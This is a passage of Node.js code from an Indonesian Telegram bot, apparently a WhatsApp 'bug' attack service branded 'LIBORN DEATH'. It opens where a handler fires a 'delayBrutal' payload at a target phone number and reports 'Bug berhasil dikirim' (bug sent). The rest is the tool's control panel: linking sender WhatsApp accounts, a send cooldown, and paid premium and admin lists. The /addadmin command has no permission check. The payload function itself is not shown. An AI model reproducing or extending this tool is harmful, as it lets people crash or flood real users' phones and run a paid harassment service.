🔎 Status : Succes sending bug ✅

©FoXx
\`\`\`
`, parse_mode: "Markdown"
    });
    
   
    console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    await delayBrutal(24, jid);
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
    
    
 await bot.editMessageCaption(`
\`\`\`
( ☠️ ) - 𝐋𝐈𝐁𝐎𝐑𝐍 𝐃𝐄𝐀𝐓𝐇

📁 Target : ${formattedNumber}
🔎 Status : Succes sending bug ✅

©FoXx
\`\`\`
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "SUCCES BUG❗", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});   




//=======plugins=======//
bot.onText(/^\/onlygrup (on|off)/, (msg, match) => {

    if (!adminUsers.includes(msg.from.id) && !isOwner(msg.from.id)) {
  return bot.sendMessage(
    chatId,
    "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
    { parse_mode: "Markdown" }
  );
}

  const mode = match[1] === "on";
  setOnlyGroup(mode);

  bot.sendMessage(
    msg.chat.id,
    `Mode *Only Group* sekarang *${mode ? "AKTIF" : "NONAKTIF"}*`,
    { parse_mode: "Markdown" }
  );
});



bot.onText(/\/addpairing (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!adminUsers.includes(msg.from.id) && !isOwner(msg.from.id)) {
  return bot.sendMessage(
    chatId,
    "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
    { parse_mode: "Markdown" }
  );
}
  const botNumber = match[1].replace(/[^0-9]/g, "");

  try {
    await connectToWhatsApp(botNumber, chatId);
  } catch (error) {
    console.error("Error in addbot:", error);
    bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat menghubungkan ke WhatsApp. Silakan coba lagi."
    );
  }
});



const moment = require('moment');

bot.onText(/\/setjeda (\d+[smh])/, (msg, match) => { 
const chatId = msg.chat.id; 
const response = setCooldown(match[1]);

bot.sendMessage(chatId, response); });


bot.onText(/\/addprem(?:\s(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
      return bot.sendMessage(chatId, "❌ You are not authorized to add premium users.");
  }

  if (!match[1]) {
      return bot.sendMessage(chatId, "❌ Missing input. Please provide a user ID and duration. Example: /addprem 6843967527 30d.");
  }

  const args = match[1].split(' ');
  if (args.length < 2) {
      return bot.sendMessage(chatId, "❌ Missing input. Please specify a duration. Example: /addprem 6843967527 30d.");
  }

  const userId = parseInt(args[0].replace(/[^0-9]/g, ''));
  const duration = args[1];
  
  if (!/^\d+$/.test(userId)) {
      return bot.sendMessage(chatId, "❌ Invalid input. User ID must be a number. Example: /addprem 6843967527 30d.");
  }
  
  if (!/^\d+[dhm]$/.test(duration)) {
      return bot.sendMessage(chatId, "❌ Invalid duration format. Use numbers followed by d (days), h (hours), or m (minutes). Example: 30d.");
  }

  const now = moment();
  const expirationDate = moment().add(parseInt(duration), duration.slice(-1) === 'd' ? 'days' : duration.slice(-1) === 'h' ? 'hours' : 'minutes');

  if (!premiumUsers.find(user => user.id === userId)) {
      premiumUsers.push({ id: userId, expiresAt: expirationDate.toISOString() });
      savePremiumUsers();
      console.log(`${senderId} added ${userId} to premium until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}`);
      bot.sendMessage(chatId, `✅ User ${userId} has been added to the premium list until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}.`);
  } else {
      const existingUser = premiumUsers.find(user => user.id === userId);
      existingUser.expiresAt = expirationDate.toISOString(); // Extend expiration
      savePremiumUsers();
      bot.sendMessage(chatId, `✅ User ${userId} is already a premium user. Expiration extended until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}.`);
  }
});

bot.onText(/\/listprem/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(chatId, "❌ You are not authorized to view the premium list.");
  }

  if (premiumUsers.length === 0) {
    return bot.sendMessage(chatId, "📌 No premium users found.");
  }

  let message = "```L I S T - V I P \n\n```";
  premiumUsers.forEach((user, index) => {
    const expiresAt = moment(user.expiresAt).format('YYYY-MM-DD HH:mm:ss');
    message += `${index + 1}. ID: \`${user.id}\`\n   Expiration: ${expiresAt}\n\n`;
  });

  bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
});
//=====================================
bot.onText(/\/addadmin(?:\s(.+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id

    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide a user ID. Example: /addadmin 6843967527.");
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, "❌ Invalid input. Example: /addadmin 6843967527.");
    }

    if (!adminUsers.includes(userId)) {
        adminUsers.push(userId);
        saveAdminUsers();
        console.log(`${senderId} Added ${userId} To Admin`);
        bot.sendMessage(chatId, `✅ User ${userId} has been added as an admin.`);
    } else {
        bot.sendMessage(chatId, `❌ User ${userId} is already an admin.`);
    }
});

bot.onText(/\/delprem(?:\s(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    // Cek apakah pengguna adalah owner atau admin
    if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
        return bot.sendMessage(chatId, "❌ You are not authorized to remove premium users.");
    }

    if (!match[1]) {
        return bot.sendMessage(chatId, "❌ Please provide a user ID. Example: /delprem 6843967527");
    }

    const userId = parseInt(match[1]);

    if (isNaN(userId)) {
        return bot.sendMessage(chatId, "❌ Invalid input. User ID must be a number.");
    }

    // Cari index user dalam daftar premium
    const index = premiumUsers.findIndex(user => user.id === userId);
    if (index === -1) {
        return bot.sendMessage(chatId, `❌ User ${userId} is not in the premium list.`);
    }

    // Hapus user dari daftar
    premiumUsers.splice(index, 1);
    savePremiumUsers();
    bot.sendMessage(chatId, `✅ User ${userId} has been removed from the premium list.`);
});

bot.onText(/\/deladmin(?:\s(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    // Cek apakah pengguna memiliki izin (hanya pemilik yang bisa menjalankan perintah ini)
    if (!isOwner(senderId)) {
        return bot.sendMessage(
            chatId,
            "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
            { parse_mode: "Markdown" }
        );
    }

    // Pengecekan input dari pengguna
    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide a user ID. Example: /deladmin 6843967527.");
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, "❌ Invalid input. Example: /deladmin 6843967527.");
    }

    // Cari dan hapus user dari adminUsers
    const adminIndex = adminUsers.indexOf(userId);
    if (adminIndex !== -1) {
        adminUsers.splice(adminIndex, 1);
        saveAdminUsers();
        console.log(`${senderId} Removed ${userId} From Admin`);
        bot.sendMessage(chatId, `✅ User ${userId} has been removed from admin.`);
    } else {
        bot.sendMessage(chatId, `❌ User ${userId} is not an admin.`);
    }
});

bot.onText(/\/cekidch (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const link = match[1];
    
    
    let result = await getWhatsAppChannelInfo(link);

    if (result.error) {
        bot.sendMessage(chatId, `⚠️ ${result.error}`);
    } else {
        let teks = `
📢 *Informasi Channel WhatsApp*
🔹 *ID:* ${result.id}
🔹 *Nama:* ${result.name}
🔹 *Total Pengikut:* ${result.subscribers}
🔹 *Status:* ${result.status}
🔹 *Verified:* ${result.verified}
        `;
        bot.sendMessage(chatId, teks);
    }
});